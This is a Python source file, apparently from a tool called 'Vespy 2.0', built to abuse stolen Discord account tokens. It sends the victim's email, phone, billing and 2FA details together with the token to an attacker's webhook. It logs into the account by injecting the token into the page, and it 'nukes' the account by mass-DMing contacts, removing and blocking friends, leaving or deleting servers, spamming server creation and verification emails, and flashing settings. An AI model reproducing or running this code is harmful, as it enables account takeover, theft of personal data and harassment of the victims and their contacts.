import requests, os, random
from discord_webhook import DiscordWebhook, DiscordEmbed
import undetected_chromedriver as driva
from selenium import webdriver
from threading import Thread
from time import sleep

def _checktoken(token):
    try:
        info = requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token}).json()
        user = info['username']+"#"+info['discriminator']
        return True
    except:
        return False

def _infotoken(token, wbh):
    try:
        info = requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token}).json()
        user = info['username']+"#"+info['discriminator']
        id = info['id']
        email = info["email"]
        if info["verified"]:
            verf = ":white_check_mark:"
        else:verf = ":x:"
        phone = info["phone"]
        avatar = f"https://cdn.discordapp.com/avatars/{id}/{info['avatar']}.png"
        if info['mfa_enabled']:
            af2 = ":white_check_mark:"
        else:af2 = ":x:"
        if info['premium_type']==0:
            N=":x:"
        elif info['premium_type']==1:
            N="``Nitro Classic``"
        elif info['premium_type']==2:
            N="``Nitro Boost``"
        elif info['premium_type']==3:
            N="``Nitro Basic``"
        else:N=":x:"
        P = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token}).json()
        if P == []:
            bil = ":x:"
        else:
            for b in P:
                if b['type']==1:
                    bil=":credit_card:"
                elif b['type']==2:
                    bil=":regional_indicator_p:"
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"Discord Token Checker", description=f"Info About Discord Token", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f"Account of {user}", value=f":id: ID: ``{id}``\n:email: Email: ``{email}``\n:mobile_phone: Phone: ``{phone}``\n:ballot_box_with_check: Verified: {verf}\n:closed_lock_with_key: 2FA: {af2}\n\n\n:purple_circle: Nitro: {N}\n:page_with_curl: Billing: {bil}\n\n\n:coin: Token: ``{token}``")
        embed.set_thumbnail(url=avatar)
        webhook.add_embed(embed)
        webhook.execute()
    except:
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"Discord Token Checker", description=f":x: **Token is invalid or expired** :x:", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        webhook.add_embed(embed)
        webhook.execute()

def _logintoken(token):
    if os.path.exists(os.getcwd()+"\\chromedriver.exe"):
        pass
    else:
        driva.install()
    try:
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        driver = webdriver.Chrome(options=opts)
        script = """
function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 1000);
}
"""+f"""\nlogin("{token}")"""
        driver.get("https://discordapp.com/login")
        driver.execute_script(script)
    except:
        pass

def _cyclestatus(token,stats):
    while True:
        requests.patch("https://discord.com/api/v8/users/@me/settings", headers={"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}, json={"custom_status": {"text": random.choice(stats)}})
        sleep(1.5)

def _massdm(token,message):
    headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
    chans = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
    for channel in chans:
        MSG = {"content": message}
        sleep(0.6)
        try:
            requests.post(f"https://canary.discord.com/api/v8/channels/{channel['id']}/messages",headers=headers,data=MSG)
        except:
            pass

def _unfriend(token,idk):
    headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
    friends = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
    for friend in friends:
        requests.delete(f"https://canary.discord.com/api/v8/users/@me/relationships/{friend['id']}",headers=headers)

def _blockal(token,idk):
    headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
    friends = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
    for friend in friends:
        requests.put(f"https://canary.discord.com/api/v8/users/@me/relationships/{friend['id']}",headers=headers,json={"type": 2})

def _serverspamm(token,names):
    headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
    for _ in range(99):
        try:
            requests.post("https://canary.discord.com/api/v8/guilds", headers=headers, json={"name": random.choice(names)})
        except:
            pass

def _leavethemall(token,idk):
    headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
    servers = requests.get("https://canary.discord.com/api/v8/users/@me/guilds", headers=headers).json()
    for server in servers:
        try:
            requests.delete(f"https://canary.discord.com/api/v8/users/@me/guilds/{server['id']}",headers=headers)
        except:
            pass
        try:
            requests.post(f"https://canary.discord.com/api/v9/guilds/{server['id']}/delete",headers=headers)
        except:
            pass

def _spamemail(token,idk):
    headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
    for _ in range(100):
        try:
            requests.get("https://canary.discordapp.com/api/v8/guilds/0/members", headers=headers)
        except:
            pass
        sleep(2)
        try:
            requests.post("https://discord.com/api/v8/auth/verify/resend", headers=headers)
        except:
            pass

def _closedms(token,idk):
    headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
    dms = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
    for dm in dms:
        requests.delete(f"https://canary.discord.com/api/v8/channels/{dm['id']}",headers=headers)

def _seizure(token,idk):
    headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
    while True:
        requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json={"theme": "light","locale": "bg"})
        sleep(1)
        requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json={"theme": "dark","locale": "ko"})

class _byebyeaccount:

    def __init__(self,token,idk):
        self.headys = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
        self.messages = ["NUK3D BY VESPY", "G3T FUCK3D", "VESPY OWN YOU", "PEW PEW", "RAWR", "IM G4Y"]
        t1 = Thread(target=self._one_)
        t2 = Thread(target=self._two_)
        t3 = Thread(target=self._three_)
        t4 = Thread(target=self._four_)
        t5 = Thread(target=self._five_)
        t6 = Thread(target=self._six_)
        t7 = Thread(target=self._seven_)
        t1.start();t2.start();t3.start();t4.start();t5.start();t6.start();t7.start()
    
    def _one_(self):
        while True:
            requests.patch("https://discord.com/api/v8/users/@me/settings", headers=self.headys, json={"custom_status": {"text": random.choice(self.messages)}})
            sleep(1.5)
    def _two_(self):
        friends = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=self.headys).json()
        for friend in friends:
            requests.delete(f"https://canary.discord.com/api/v8/users/@me/relationships/{friend['id']}",headers=self.headys)
    def _three_(self):
        servers = requests.get("https://canary.discord.com/api/v8/users/@me/guilds", headers=self.headys).json()
        for server in servers:
            try:
                requests.delete(f"https://canary.discord.com/api/v8/users/@me/guilds/{server['id']}",headers=self.headys)
            except:
                pass
            try:
                requests.post(f"https://canary.discord.com/api/v9/guilds/{server['id']}/delete",headers=self.headys)
            except:
                pass
    def _four_(self):
        for _ in range(99):
            try:
                requests.post("https://canary.discord.com/api/v8/guilds", headers=self.headys, json={"name": random.choice(self.messages)})
            except:
                pass
    def _five_(self):
        for _ in range(100):
            try:
                requests.get("https://canary.discordapp.com/api/v8/guilds/0/members", headers=self.headys)
            except:
                pass
            sleep(2)
            try:
                requests.post("https://discord.com/api/v8/auth/verify/resend", headers=self.headys)
            except:
                pass
    def _six_(self):
        dms = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=self.headys).json()
        for dm in dms:
            requests.delete(f"https://canary.discord.com/api/v8/channels/{dm['id']}",headers=self.headys)
    def _seven_(self):
        while True:
            requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=self.headys, json={"theme": "light","locale": "bg"})
            sleep(1)
            requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=self.headys, json={"theme": "dark","locale": "ko"})